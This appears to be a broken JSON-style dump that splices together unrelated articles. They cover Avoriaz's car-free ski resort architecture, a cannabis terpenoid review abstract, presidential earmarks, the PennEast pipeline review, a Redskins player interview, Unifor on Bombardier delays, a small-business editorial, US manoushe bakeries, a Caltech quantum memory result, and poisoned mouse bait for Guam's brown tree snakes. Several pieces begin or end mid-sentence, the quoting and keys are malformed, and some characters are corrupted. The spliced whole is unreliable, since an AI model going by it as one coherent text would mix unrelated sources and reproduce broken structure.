'In Avoriaz there will be no cars. The roads will serve as ski runs, the architecture will integrate itself into the landscape, but will be new and ground-breaking. It is not necessary to explain how these proposals will cause an outcry!'\n\n© Alastair Philip Wiper\n\nTo fulfil his vision, Bremond hired the young, recently graduated architect Jacques Labro, who assembled a team and set about designing Avoriaz. In 1966, the resort opened to guests, with one hotel, the Hotel des Dromonts, sitting on top of the cliff. It must have been quite surreal. The French writer, Regine Deforges, was hired to install a library at the hotel: 'At the time one could only access its 1800m by a swaying and squeaking cable car, which lifted one above the level of the trees. We got out relieved but with trembly legs. But what a reward! An immense white area limited only by the sky, the steep slopes cheered up by the presence of fir trees and the cliff face, a cliff like the one which plunges into the North Sea or the Channel. I anticipated the sound of the sea, but all around me was silence -- a unique, pure silence, which made one respectful of such virgin beauty. A horse-drawn carriage transported me away and the night swallowed up the mountains. \"We are here,\" cried a voice. Looking up I saw a dark mass spotted here and there with lights, a chateau from a dark novel: it was the Hotel des Dromonts on the eve of Christmas 1966.'\n\n© Alastair Philip Wiper\n\nBremond also found a great way to draw publicity to Avoriaz, by launching the Festival international du film fantastique d'Avoriaz, a horror and fantasy film festival, which ran from 1973 to 1993. The fantastical nature of the buildings and their surroundings was the perfect backdrop to the festival, which quickly became well respected, attracting directors such as David Lynch and Roman Polanski.\n\n© Alastair Philip Wiper\n\nI first visited Avoriaz in 2004, as a 23-year-old ski bum, and was immediately struck by the architecture, a subject I knew nothing about. It was the spookiness of the buildings that really grabbed my attention. I thought they had a dark side, in a good way -- and I immediately began to imagine what the architect was thinking and what he was influenced by when he was designing this place. Later on, I saw Robert Weine's Cabinet of Dr Caligari and wondered if it had been an influence: 'I had seen it, but no, it wasn't an influence!' says Jacques Labro. 'The mountains were more of an inspiration. And other architects of the time -- Alvar Alto, Frank Lloyd Wright, Gaudi, the expressionist architects that were the base of my studies.\n\n© Alastair Philip Wiper\n\n'The buildings were not intended to have this fantastical element, but when Bremond came up with the idea for the festival I thought it fitted perfectly. I could see why others thought that. Bremond is very cultured, he is very passionate about film and music. But I think that the buildings only add to the fantastic nature of the area; it has always been like that -- the cliffs, the plateau, the fact that when we opened Avoriaz there was no road, you had to take the cable car.\n\n'Actually the whole idea of no cars was very, very important to the concept. I think it is still completely unique in the world for a skiing resort. It was Jean Vuarnet who pushed the idea that you had to be able to ski in and out of every building, and this was very controversial at that time because the car was king, it was almost a symbol of France. But the idea of parking your car at the bottom of the cliff, and then leaving the ground and flying through the air in a cable car, and arriving in a new, magical place where everything looks different, like another world, was very important when we were designing Avoriaz.\n\n© Alastair Philip Wiper\n\n'You should be leaving your normal world behind and experiencing something else for a week. We even brought reindeer from Lapland to pull the sleds, to add to the magical feeling -- but it ended up being a bit of a disaster because you cannot control a reindeer the way you can a horse -- they get scared very easily -- so soon there was baggage strewn all over the resort by out-of-control reindeer!'\n\nAnother person deeply affected by Avoriaz, was fellow ski bum Simon Cloutier, who first saw it in the Eighties. He also fell in love with the architecture -- so much so that he decided to become an architect so he could continue the work on those buildings. At architecture school in Grenoble, Cloutier made his final project about a new sector of the town, and part of that project has now been realised in the new Amara area that opened last year. Labro and Cloutier now work together on Avoriaz through the Atelier d'Architecture d'Avoriaz, with Cloutier based in Avoriaz and Jacques based in Paris.",
  "latent_17335": "Review article\n\nAbstract\n\nTetrahydrocannabinol (THC) has been the primary focus of cannabis research since 1964, when Raphael Mechoulam isolated and synthesized it. More recently, the synergistic contributions of cannabidiol to cannabis pharmacology and analgesia have been scientifically demonstrated. Other phytocannabinoids, including tetrahydrocannabivarin, cannabigerol and cannabichromene, exert additional effects of therapeutic interest. Innovative conventional plant breeding has yielded cannabis chemotypes expressing high titres of each component for future study. This review will explore another echelon of phytotherapeutic agents, the cannabis terpenoids: limonene, myrcene, α-pinene, linalool, β-caryophyllene, caryophyllene oxide, nerolidol and phytol. Terpenoids share a precursor with phytocannabinoids, and are all flavour and fragrance components common to human diets that have been designated Generally Recognized as Safe by the US Food and Drug Administration and other regulatory agencies. Terpenoids are quite potent, and affect animal and even human behaviour when inhaled from ambient air at serum levels in the single digits ng·mL(-1) . They display unique therapeutic effects that may contribute meaningfully to the entourage effects of cannabis-based medicinal extracts. Particular focus will be placed on phytocannabinoid-terpenoid interactions that could produce synergy with respect to treatment of pain, inflammation, depression, anxiety, addiction, epilepsy, cancer, fungal and bacterial infections (including methicillin-resistant Staphylococcus aureus). Scientific evidence is presented for non-cannabinoid plant components as putative antidotes to intoxicating effects of THC that could increase its therapeutic index. Methods for investigating entourage effects in future experiments will be proposed. Phytocannabinoid-terpenoid synergy, if proven, increases the likelihood that an extensive pipeline of new therapeutic products is possible from this venerable plant. http://dx.doi.org/10.1111/bph.2011.163.issue-7.\n\n© 2011 The Author.

  "latent_17380": "He sought $3 million for a forest conservation project in Minnesota, $2.1 million for a neutrino detector at the South Pole and $28 million for General Electric and Siemens to do research on hydrogen-fuel turbines.\n\nThe projects, itemized in thousands of pages of budget documents submitted last week to the House and Senate Appropriations Committees, show that the debate over earmarks is much more complex than the “all or nothing” choice usually presented to the public. The president and Congress both want to direct money to specific projects, but often disagree over the merits of particular items.\n\nThe White House contends that when the president requests money for a project, it has gone through a rigorous review — by the agency, the White House or both — using objective criteria.\n\nCongressional leaders said they would focus more closely on items requested by the president this year. “The executive branch should be held accountable for its own earmark practices,” said the House Republican leader, Representative John A. Boehner of Ohio.\n\nSpeaker Nancy Pelosi of California said Democrats agreed that “the large number of presidential earmarks deserve the same scrutiny and restraint” as those that originated in Congress.\n\nMr. Bush has often derided Congressional earmarks as “special interest items” that waste taxpayer money and undermine trust in government. Congress, he said, included more than 11,700 earmarks totaling almost $17 billion in spending bills for the current fiscal year.\n\nBut some of those earmarks were similar or identical to ones included in the 2009 budget that Mr. Bush sent Congress last week. For example, Senator Richard J. Durbin of Illinois, the Democratic whip, obtained an earmark of $1.5 million last year to deal with the emerald ash borer, a beetle that attacks trees, lawns and crops. Mr. Bush now wants more money to fight that insect.\n\nAdvertisement Continue reading the main story\n\nA similar pattern is evident at the Bureau of Reclamation, an Interior Department agency that provides water and power in 17 states. Congress and the White House both support construction of a huge water project known as Mni Wiconi, which would deliver water from the Missouri River to rural South Dakota.\n\nAt the behest of South Dakota lawmakers, Congress earmarked $38 million for the project last year. In its budget justification for 2009, the bureau requests $779 million for more than 150 specific projects, including $26 million more for the one in South Dakota.\n\nSimilarly, the Bush administration is requesting money for a water project near the Nueces River in South Texas — the same project that benefited from a bipartisan Congressional earmark last year.\n\nIn effect, the president accepted some Congressional earmarks as worthy of continued federal support. But he rejected many more and sought no money for them in 2009.\n\nThe White House defines “earmarks” in a way that applies only to projects designated by Congress, not to those requested by the administration.\n\n“Earmarks,” as defined by the White House, “are funds provided by Congress for projects or programs where the Congressional direction (in bill or report language) circumvents the merit-based or competitive allocation process, or specifies the location or recipient, or otherwise curtails the ability of the executive branch to properly manage funds.”\n\nSean M. Kevelighan, a spokesman for the White House Office of Management and Budget, said: “The administration’s budget proposals are available for any taxpayer to see. We submit a justification for each item. That’s very different from what happens on Capitol Hill, where items are dropped into legislation at the last minute, for no rhyme or reason other than the seniority of a member of Congress.”\n\nDemocrats sometimes say the Bush administration has approved projects to help its political allies, but such assertions are hard to prove. In the 2004 campaign, administration officials raced around the country handing out money for federal programs, including some that Mr. Bush had tried to cut or eliminate.\n\nAdvertisement Continue reading the main story\n\nSenator John McCain of Arizona, the leading candidate for the Republican presidential nomination, is winning support with a different tactic. Mr. McCain regularly receives cheers and applause when he declares, “I will not sign a bill with earmarks in it, any earmarks in it.”\n\nIt is virtually impossible to determine the dollar value of items requested by the president because they are scattered through voluminous budget documents prepared by dozens of federal offices and agencies, and the administration does not publish comprehensive lists, as Congress did last year for the first time.\n\nAdministration officials say that many projects in the president’s budget — though they may look like Congressional earmarks — were evaluated as part of a coherent program to address some national need, like pest eradication or flood control.\n\nMr. Bush’s budget says, for example, that the Army Corps of Engineers uses “performance-based guidelines” to set priorities for navigation and flood control projects, ensuring that benefits will outweigh costs.\n\nBut the Government Accountability Office, an investigative arm of Congress, found that the corps’s studies of proposed projects were “fraught with errors, mistakes and miscalculations” that tended to overstate the benefits and understate the costs.\n\nWhen Transportation Department officials unveiled their 2009 budget this week, they boasted of more than two dozen new projects, and they said they had carefully weighed factors like “benefits per passenger mile.”\n\nThe president requested $125,000 for a new rapid bus line on Troost Avenue in Kansas City, Mo., and $11 million for bus-only lanes along parts of Wilshire Boulevard in Los Angeles.\n\n“We are putting tax dollars where they will move the greatest number of people, so taxpayers get a good return on their investment,” said James S. Simpson, administrator of the Federal Transit Administration.\n\nAdvertisement Continue reading the main story\n\nCriticism of earmarks has been a constant theme in the Bush administration. Within three months of taking office, Mr. Bush asked Congress to kill many of the earmarks enacted into law at the end of the Clinton administration.\n\nIn his State of the Union address last year, Mr. Bush complained that 90 percent of Congressional earmarks were concealed in committee reports.\n\n“You didn’t vote them into law,” Mr. Bush told Congress. “I didn’t sign them into law.

  "latent_17397": "Citing concerns about adverse effects on the Delaware watershed, the Delaware River Basin Commission says the proposed PennEast pipeline is subject to a commission review and public hearing.\n\nThe commission, which oversees the watershed, is requesting a joint meeting and public hearing with the Federal Energy Regulatory Commission, the agency tasked with ultimately approving the project.\n\nThe natural gas pipeline will require both the withdrawal and discharge of a substantial quantity of water for hydrostatic testing, says an April 23 letter the DRBC sent to federal commission.\n\nThe testing involves filling the pipe with pressurized water, which may be dyed, to help detect any leaks before the pipeline is buried in the ground and hooked up for service.\n\nDepending upon the water sources and discharge locations, the project may entail the diversion of a large quantity of water into or out of the basin, the letter says.\n\nThe 108-mile pipeline is also expected to cross some reservoir and recreational areas within the 330-mile watershed, which stretches from the river's headwaters in Hancock, N.Y., to the mouth of the Delaware Bay.\n\nThe pipeline would extend through the Delaware River Basin from southern portions of Luzerne County to Mercer County, N.J., PennEast officials said.\n\nDRBC's process includes a review of the portion of pipeline within the basin, the development of a \"draft docket\" (DRBC's version of a permit) that may contain conditions of approval, and will include an opportunity for public comment on the draft docket in writing or at a public hearing, explained Clarke Rupert, communications manager for the DRBC.\n\nHe was unsure how much time the public might have to comment, and how long it could take for the commission to render a decision, but said it's not the DRBC's intention to delay the project.\n\nThe letter suggests the DRBC's public hearing could be held jointly during a FERC public hearing on the pipeline's draft environmental impact statement.\n\n\"It would be a means of cooperation so the public would need to come to only one forum to provide their comments instead of going to one public hearing, and then a separate hearing that FERC would have,\" Rupert said.\n\nFERC is open to holding a joint meeting with the DRBC, though it's still early in the review process, said the organization's spokeswoman, Tamara Young-Allen.\n\n\"We are open to anything, but it's really early in the process to have a date set for that type of meeting,\" she said. \"If there is such a meeting, we will issue a notice to the public.\"\n\nFERC is ultimately responsible for approving the pipeline project, but Rupert pointed out the DRBC is a federal interstate agency tasked specifically with managing the water resources of the Delaware watershed.\n\n\"FERC will be looking at other environmental impacts that aren't just related to water. We have our own set of rules and regulations that need to be adhered to,\" he said.\n\nA joint meeting has yet to be set up between the two agencies.\n\nPennEast is in the pre-filing stage of its project, where it is collecting public comments.\n\nPennEast officials have said they anticipate filing their application, including the final pipeline route, with FERC by July.\n\nThe DRBC wouldn't begin its review until after that application is filed, Rupert said.\n\n\"We've informed PennEast, based on what we know, they need to come to DRBC to file an application, and for us to review that application to make sure it meets all our rules and regulations,\" Rupert said.\n\nThe DRBC first advised PennEast it may be subject to review in November, and directed PennEast to file an application with the DRBC within 90 days.\n\nCiting continuing route evaluation, design and scoping activities, PennEast in January requested an extension of DRBC's filing directive, which was approved, the letter said.\n\nDRBC Executive Director Steven J. Tambini, however, advised PennEast that the commission's review will not be abbreviated to accommodate PennEast's desired project schedule.\n\nPipeline officials met with DRBC in the fall, PennEast spokeswoman Patricia Kornick said.\n\n\"We knew they would have some input into the project, and we wanted that input. We have chosen to go through this pre-filing stage to get public input, as well as input from the different agencies, the Delaware River Basin Commission being one of them,\" she said.\n\n\"Part of our own comprehensive review process includes meeting with the different agencies, getting their input and minimizing the impact to the environment and community.\"\n\nThe DRBC was created in 1961 by a pact between the states of New York, New Jersey, Pennsylvania and Delaware and the federal government. Its members include the governors of the four states, as well as the Army Corps of Engineers.\n\nctatu@mcall.com\n\nTwitter @ChristinaTatu\n\n610-820-6583",
  "latent_17407": "You probably know Washington Redskins Safety Akeem Davis from the NFL Network show Undrafted, or from one of his many tone setting special teams hits during his first season in the nation's capital. Davis went undrafted in 2013, but the Memphis product didn't give up on his dream there. Davis continued to train, grind, and work his ass off to make his NFL dream a reality.\n\nDavis got the chance to prove himself with an invite to Washington Redskins training camp. Despite making the Redskins final roster after a strong camp and pre-season, Davis' roller coaster ride to capturing his dream of making it in the NFL wasn't quite over. After the Redskins claimed Duke Ihenacho the team waived the undrafted rookie, only to sign him to the practice squad the next day. Davis was waived and added to the practice squad once more before being promoted to the 53-man roster on October 7th; and Davis never looked back.\n\nSo what do you need to know about the undrafted, hard-hitting, quiet, yet vocal leader?\n\nMy interview with Davis:\n\nDavis is a tone setter, and although generally quiet, Davis isn't afraid to speak up; as shown in this video from CSN Washington. I asked Davis if he envisioned becoming more of a vocal leader moving forward:\n\nIt all depends, as an undrafted rookie I just came to work every day put my head down and keep grinding. I'm generally not outspoken, and I prefer to let my playing and production speak for itself, but I'm also not afraid to speak up when I need to.\n\nDavis was born to be a gunner on special teams, he is physical and embraces his role on special teams. I asked Davis if he envisioned himself becoming a physical, in the box type safety, or more of a rangy free safety.\n\nIf I could pick both I would, I view myself as a versatile player. Obviously I'm not afraid to lower the boom, but I have experience playing both strong and free safety. I think Coach Raheem saw me as more of a rangy safety, but I'm ready to embrace whatever role the new coaching staff has in mind for me.\n\nThe safety position is one of the more wide open on the Redskins roster, the Redskins will likely have two new starters lined up on opening day in 2015, I asked Davis what he had to improve upon to grab a bigger role:\n\nI just need to work, show my accountability, dependability, and availability. I've learned a lot about being a professional from guys like DeAngelo Hall and Ryan Clark. I've learned how to have a good work ethic, and be a good teammate. I just need to do my best, keep working at my craft, and let the coaches make those decisions.\n\nNow that you have a full year on the active roster under your belt, what are your goals for the 2015 season? What do you want to improve?\n\nI knew my role going into last season, but moving forward I want to continue to establish myself as a core special teams player, and continue to become a complete player. Improving every aspect of my game, from special teams to safety. I want to be a better person and teammate. I want to be valuable, an asset to the Redskins, I want to be ready to perform all my roles at a high level.\n\nWhat's the biggest obstacle you've had to overcome?\n\nThe death of my mother, going undrafted, and tearing my ACL don't come close. I think about her every day, and you never truly overcome that.\n\nFavorite football memory:\n\nDelivering the hit on Dwayne Harris, it felt great to make a big play, it swung the momentum in our favor and we ended up coming out on top.\n\nWhat current and former player do you model your game after?\n\nRyan Clark and Brian Dawkins. I love the passion and intensity they both play the game of football with. Not just on the field, but how they prepare, and study. I admire the two of them on and off the field, as football players and men, and I was lucky enough to learn a lot from Ryan Clark while we were teammates.\n\nWhat did you dream of being as a kid?\n\nI've always wanted to be a football player, which is why it was so satisfying to make it to the NFL after such a long journey, but I'm not satisfied yet, I want to be great.\n\nWhat do you want to do after football?\n\nI would like to be a high school athletic director. I think I could continue to be a role model and give back to the kids, and stay involved in athletics.\n\nDavis is a young player, and one that I think the Redskins would be wise to keep around. There is always plenty of drama surrounding the Redskins locker room no matter what time of the year it is, and the Redskins could use a few more players like Davis who comes to work with his hard hat on every day and embraces his role. Not to mention that Davis has become a key part of the Redskins special teams unit. Give Davis a follow on Twitter @DA_DREAM47",

We will not let Bombardier’s incompetence hold our patient and loyal customers hostage. We will consider all legal and financial actions at our disposal to address this situation.”\n\nAs the continued delays dictate sentiment within the TTC and at Toronto City Hall, Unifor is calling for calm and expressing its commitment to working with all parties to resolve the concerns surrounding the delay. The union also stressed that the issue must be addressed without putting well-paying Ontario jobs at risk.\n\n“We are eager to ensure Bombardier’s success,” Andy Savela, Unifor national staff representative, said. “At a time when Canada is fighting hard to protect and create good-paying jobs, we need to ensure we do all we can to maximize the benefits that result from Bombardier Transportation’s significant operations in Ontario.”\n\nThe union noted Bombardier Transportation employs 2,200 highly-skilled employees in the province and has over 1,000 suppliers.\n\n“Unifor is optimistic that there are ways to improve productivity. We have some innovative ideas and are discussing those with the company,” Savela said.\n\nMeanwhile Unifor also acknowledged the TTC’s concerns and the need to address them. The union said it is “optimistic” Bombardier, the TTC and the provincial government can find a way to address the delays and “secure a bright future for Bombardier.”\n\n“We’re asking that those concerns be addressed in a manner that does not undermine the long-term economic benefits that come from the success of Bombardier Transportation,” Unifor said.",
  "latent_17486": "Small business is big business.\n\nI know quite a few business owners out there who may be scratching their heads at this audacious statement. In fact, they’re probably asking themselves how such an assertion can possibly hold true since most spend each day struggling to keep the lights on or trying to find another creative way to keep that single client. How can this be true when 95% of the roughly 2 million African American businesses operating nationwide are sole proprietorships? How can minnows compete against corporate whales that gobble up market share in every industrial sector?\n\nIf you’ve asked those questions or others like them, my fellow entrepreneurs, then that is exactly the problem. To succeed in today’s environment, business owners must first change their mindset. We must stop embracing a survival mentality instead of focusing on a growth strategy. That outlook continues to be held by a large number of entrepreneurs who constantly scramble to maintain contracts from year to year and, as a result, subsist as CEOs of micro-businesses operating hand to mouth.\n\nMoreover, I find far too many African American companies willing to promote their minority status as their core competence instead of how their unique products and services can benefit prospective and existing clients. It’s a flawed approach that pits them against countless companies that are part of the supplier diversity universe, including firms owned by women, Latinos, members of the LGBT community, and veterans, to name a few. To snare and retain customers, you must present a compelling value proposition to corporate clients and consistently demonstrate that your company will make good on its commitments through incomparable quality and performance, period.\n\nSo just what does it take for your small business to succeed today? You need these four key ingredients: scalability, capability, technological adaptability, and branding power. First, identify those partners–either for long-term viability or a short-term venture–that will enable you to bid for, secure, and complete business-building contracts with major corporations. You’ll increase your company’s top line and solidify its can-do reputation. Second, make sure you have the right people, resources, and performance measurement tools in place to ensure predictable and optimal outcomes regardless of the size of any job. Next, effectively employ what I call “the great equalizerâ€–technology–to effect greater financial and operational efficiency as well as to expand outreach efforts through social media. Lastly, given that you’ve been able to establish an unassailable track record, you must aggressively communicate your company’s exceptionalism through multiple channels as part of its brand message. By employing these strategies, you will cement your company’s position as an essential supplier to any corporate client.\n\nHow do you get started? I can think of no better place to reset your company than our Entrepreneurs Conference in Columbus, Ohio, May 14—17. I am not being the least hyperbolic when I say that our event (this year’s theme, “Join the Small Business Revolutionâ€) offers one of the best avenues to take your company to the next level. If you attend with the right attitude what has become the nation’s largest gathering of entrepreneurs, I guarantee that you will make valuable business contacts, develop fresh ideas, and may even initiate a deal or two. It also provides access to decision makers–whether you meet the CEOs of the BE 100s, our listing of the nation’s largest black-owned companies, who are powerful role models and offer valuable connections, or the top corporate executives who can direct you to prospective supplier opportunities.\n\nIt all begins with you. You can no longer think of your business as that traditional small enterprise. With a grand vision and strategic focus, your venture can grow into a powerful, profitable engine of innovation and employment. So don’t hesitate. Join our revolution today.",

  "latent_17546": "This story originally appeared on Fortune.com.\n\nIn Lebanon, the manoushe is omnipresent — a flatbreadbest served fresh from the corner bakery’s oven and eaten on the go. It’s typically slathered in zaatar, a thyme herb mix with sesame seeds, often with dollops of labneh, a tangy thick yogurt. Despite the waves of Lebanese immigrants who have immigrated to the U.S.and made manoushe at home or at local bakeries, it has yet to be widely available to the general public.\n\nBut that’s changing. A handful of immigrant entrepreneurs have launched manoushe-centric businesses in city centersacross the country geared towards a diverse customer base—and they’re flourishing.\n\n“Somebody needed to do it,” laughs Ziyad Hermez, 32, the owner of Manousheh NYC, New York City’s only “manousherie” (falafel, hummus, and other regional staples like baba ganoush, are not on the menu). At the tiny, sleek, glass-front eatery — which opened in March 2015 in the trendy West Village — a carefully curated mix of American indie-pop songs and Arab classics play over the speakers. Hermez and his employees dress casually, speaking in English with a sprinkling of Arabic. Customers range from curious passersby who probably couldn’t locate Lebanon on a map, to NYU students, to natives of Lebanon and the surrounding region who are living or traveling in New York.\n\nRelated: How to Have a Fantasy Day in San Diego\n\nA young woman visiting from Lebanon nibbles on a manoushe. “If I close my eyes, it’s like I’m in Beirut,” she says.\n\nAmid the scent baking bread, which wafts from the colossal central oven, Hermez, who is of Lebanese descent but grew up in Kuwait, explains that the inspiration for Manousheh NYC was simple: Longing. When he moved to Washington,D.C., for college in 2002, he was astonished he couldn’t find a fresh baked manoushe (sometimes spelled manousheh, mana’oushe, man’oushe, and man’oushé in English). The hunt continued when he moved to New York City and was working in IT.\n\nHe missed the taste of a freshly baked manoushe and the intimate experience of walking into the neighborhood bakery that sold them. And he felt New York City was ripe for a manousherie; the flatbread is the perfect snack—like aslice of pizza, a bagel, or falafel—for busy city dwellers eating on the go.\n\nToday, business is brisk. Each manoushe at Manousheh NYC sells for $5 to $8, and customers can choose from a number of styles, including a daily special and “lahem bi ajine,” which is topped with minced beef, tomato and spices. Hermez estimates he sells an average of 200 manaeesh (the plural of manoushe) per day.\n\nOver on the West Coast, Reem Assil has been selling manaeesh at pop-ups, catered events, and a local farmer’s market in San Francisco for several years. She offers a few non-standard artisanal toppings like pickled turnips, but uses the traditional, albeit slow, domed saj grill, which issimilar to an upside-down wok. At the farmer’s market, customers of all types patiently wait in line.\n\nRelated: These 4 Products Will Make Traveling Much Easier\n\n“We’re making a little extra effort to translate, but not water it down,” she explains.\n\nAssil, 33, was born in America to Syrian and Palestinian parents and grew up outside Boston, eating homemade manaeesh. She believes the fresh baked flatbread has the potential to take off in the U.S., especially because buying food is no longer just “transactional” for the millennial generation. According to Assil, “it’s about the experience.”\n\nHaving raised $50,000 on Kickstarter as part of an OpenTable competition for aspiring restaurant owners (which she won), Assil is planning to open a cafe selling Arab street foods in Oakland this fall.\n\nJay Hosn, a Lebanese immigrant who arrived in the U.S. in the early 1970s, is the owner of Goodie’s, a Mediterranean specialty food shop in Northern Seattle. He began making and selling fresh manaeesh in January 2014, because he, like Hermez, missed the taste. Having previously lived inSouthern California, with its sizable Arab and Arab-American communities, he could buy a manoushe “every mile.”\n\nWhen Hosn launched his manaeesh endeavor in a corner of Goodie’s, the business exploded. He even paid for a baker to come from Lebanon to teach manoushe making for a week. Eventually, Man’oushe Express replaced Goodie’s, which has since moved downstairs.\n\n“I am very surprised,” says Hosn of the manoushe’s instant popularity. He guesses 40 to 50% of his customers are American-born with no connection to Lebanon or the surrounding countries. “They’re hooked on it!” he says with delight.\n\nNone of these manoushe entrepreneurs know why previous generations of Lebanese immigrants didn’t market the fresh baked manaeesh to the general public. Some believe it was the scarcity of good zaatar in the U.S., others guessthey figured manoushe, which is considered a simple street food and is often eaten for breakfast, wouldn’t translate.\n\nBut in 2013, with the U.S. publication of Man’oushé, Inside the Street Corner Lebanese Bakery, a beautiful, coffee table-style cookbook by Barbara Massaad, the manoushe received a dose of mainstream publicity.\n\nRelated: How to Have a Fantasy Day in Mumbai\n\n“People used to make fun of me,” Massaad recounts,speaking from Beirut. When she started working on theproject, everyone thought an entire cookbook dedicated to the common manoushe was odd. But Massaad’s loving and respectful treatment, visible in her gorgeous photos and 70 recipes, has since elevated the manoushe, even in Lebanon. Assil calls Massaad’s cookbook her “bible” and Hermez proudly displays it on the counter of Manousheh NYC.\n\nTime will tell if manoushe eateries will become part of the U.S’s cultural and economic fabric, as so many other establishments selling international food have. Early signs are promising: Hermez has received franchising inquiries from Los Angeles, Toronto, Montreal, Berlin and Amsterdam.\n\nWhile he believes Manousheh NYC’s success can eventuallybe replicated in cities globally, he’s focusing on the one store. “It’s way too soon,” he says. The franchise offers can wait — for now.",

  "latent_17848": "By , 6\n\nPORTLAND, Ore. -- The California Institute of Technology has demonstrated that quantum entanglement can simultaneously transfer whole blocks of quantum information, providing a proof-of-concept for future quantum HDs.The Caltech team claimed that its device is the harbinger of quantum HDs that someday may challenge traditional storage technologies with optical memories that use entanglement for access. In its demonstration, the team transfered the state of four quantum memories to an optical signal and back again, claiming that the principle could be extended to any number of parallel transfers into and out of future quantum HDs.\"We have shown four quantum memories talking to four quantum channels that can be coherently absorbed by virtue of electromagnetic transparency, which slows down the light to zero for storage,\" said Kyung Soo Cho, a doctoral candidate at CaltechElectromagnetically-induced transparency is a coherent optical nonlinearity which renders a medium transparent, enabling light encoded with quantum states to be stopped within a quantum memory device.Caltech's entanglement technique used lasers to cool the four quantum memories--each a collection of 1 million cesium atoms magnetically separated by 1 millimeter. The magnetic spin of each atom in the quantum memory spins either up or down, collectively describing a spin-wave that represents the whole ensemble. By simultaneously irradiating the quantum memories with laser beam encoding, the spin waves of the four quantum memories were identically entangled. This technique, called \"measurement induced entanglement,\" was first achieved at Caltech five years ago, but only for two ensembles. Caltech has now demonstrated theoretically that the technique can be extended to any number of nodes.The Caltech group also characterized the decay of the entangled quantum states among the separate nodes, showing how the system decays from a complex quantum state into classical memory values in what they claims is a predictable, repeatable manner.Next, the researchers want to study the dynamics of entanglement decay as applied to entangled spin waves in quantum magnetic memories. They also want to expand quantum \"metrology\" whereby quantum states can be generated, stored and transferred using measurements of the ordinarily fragile states of quantum memories.Research funding was provided by the National Science Foundation, the Defense Department and Northrop Grumman Corp., among others.",

  "latent_18132": "Dead mice packed with drugs were recently airdropped into Guam's dense jungle canopy—part of a new effort to kill an invasive species of snake on the U.S. Pacific island territory.\n\nIn the U.S. government-funded project, tablets of concentrated acetaminophen, the active ingredient in Tylenol, are placed in dead thumb-size mice, which are then used as bait for brown tree snakes.\n\nIn humans, acetaminophen helps soothe aches, pains, and fevers. But when ingested by brown tree snakes, the drug disrupts the oxygen-carrying ability of the snakes' hemoglobin blood proteins.\n\n\"They go into a coma, and then death,\" said Peter Savarie, a researcher with the U.S. Department of Agriculture (USDA) Wildlife Services, which has been developing the technique since 1995 through grants from the U.S. Departments of Defense and Interior.\n\nOnly about 80 milligrams of acetaminophen—equal to a child's dose of Tylenol—are needed to kill an adult brown tree snake. Once ingested via a dead mouse, it typically takes about 60 hours for the drug to kill a snake.\n\n\"There are very few snakes that will consume something that they haven't killed themselves,\" added Dan Vice, assistant state director of USDA Wildlife Services in Hawaii, Guam, and the Pacific Islands.\n\nBut brown tree snakes will scavenge as well as hunt, he said, and that's the \"chink in the brown tree snake's armor.\"\n\nSnakes Pests Decimated \"Naïve\" Wildlife\n\nThe brown tree snake is an arboreal species native to Australia, Papua New Guinea, and several Pacific islands. The snake preys on birds, lizards, bats, and small mammals.\n\nInadvertently introduced to Guam (map) from the Solomon Islands after World War II, brown tree snakes are responsible for the extinction or severe reduction of several of the island's native species.\n\nThe brown tree snake \"is a nocturnal, arboreal predator. There's just nothing like it here. It arrived here and found an island full of very naïve native wildlife,\" Vice said. (See \"Snake Plague on Guam Impacts Trees.\")\n\nOver the years, scientists have developed several strategies to fight the reptile pest, including traps, snake-detecting dogs, and nighttime spotlight searches along airport and seaport fence lines.\n\nMost of these strategies have focused on keeping the snake species from leaving Guam and sneaking onto ships headed for other islands, such as Hawaii, where scientists fear the predators could wreak similar havoc.\n\nBy contrast, this latest approach aims to take the fight into Guam's jungles, where most of the invasive snakes reside.\n\nA popular misconception about Guam, Vice said, is that the entire island is overrun by brown tree snakes. In reality, most of the snakes are concentrated in the island's jungles, where it is difficult for humans to reach.\n\n\"You don't walk out the front door and bump into a snake every morning,\" Vice said.\n\nRadio-tagged Bait to Help Track Effectiveness\n\nBefore the laced mice are airdropped, they are attached to \"flotation devices\" that each consist of two pieces of cardboard joined by a 4-foot-long (1.2-meter-long) paper streamer.\n\nThe flotation device was designed to get the bait stuck in upper tree branches, where the brown tree snakes reside, instead of falling to the jungle floor, where the drug-laden mice might inadvertently get eaten by nontarget species, such as monitor lizards.\n\nThere are few other species on Guam that could be tempted by the mouse bait, USDA's Savarie said, because the brown tree snakes have eaten most of them.\n\nOn September 1 USDA researchers performed a small-scale airdrop of about 200 baited mice onto 20 acres (8 hectares) of jungle around the U.S. Naval Base in Guam. USDA personnel flying low over Guam's jungles in helicopters dropped the baited devices one at a time, to ensure even coverage.\n\nThe drop was only the second in the project's history, and was done to help refine the technique before a larger field test is conducted in late 2010 or early 2011.\n\nA small subset of mice in the latest drop was equipped with radio transmitters, which the team will use to determine the baits' efficiency.\n\n\"If we go out tomorrow and the radio signal from the bait has moved, it's very likely that [it was eaten by] a snake,\" Savarie said.\n\nWildlife Services collects the bodies of only the snakes that eat the mice that have radiocollars.\n\n\"We would not find other snakes that would eat the bait,\" said Kathy Fagerstone, Technology Transfer Program Manager for USDA Wildlife Services.\n\n\"However, the amount of acetaminophen in each mouse is small and would not present environmental hazards.\"\n\nTree Snakes Have a Chink in Their Armor\n\nThe baited mice could prove to be an effective tool against Guam's brown tree snakes, especially medium- and large-size adults, said Haldre Rogers, a biologist at the University of Washington in Seattle who researches the effects of bird loss on Guam's native forests.\n\n\"The development of more tools like this is very important for restoring Guam's forests in the long run,\" said Rogers, who was not involved in the USDA project.\n\nBut all the tools currently at scientists' disposal, including the drug-filled mice, will at best simply control the island's snake population, not eradicate it entirely, she said.\n\n\"It's another arrow in our quiver,\" she said. \"Unfortunately, we don't have the silver bullet for brown tree snakes yet.\"\n\nUSDA's Vice agreed: \"There are a lot of things out there to control brown tree snakes. They all work, but they don't work completely,\" he said. \"The idea of this aerial delivery of oral toxicants is that we now have a control tool that we can apply across a larger landscape.\"",
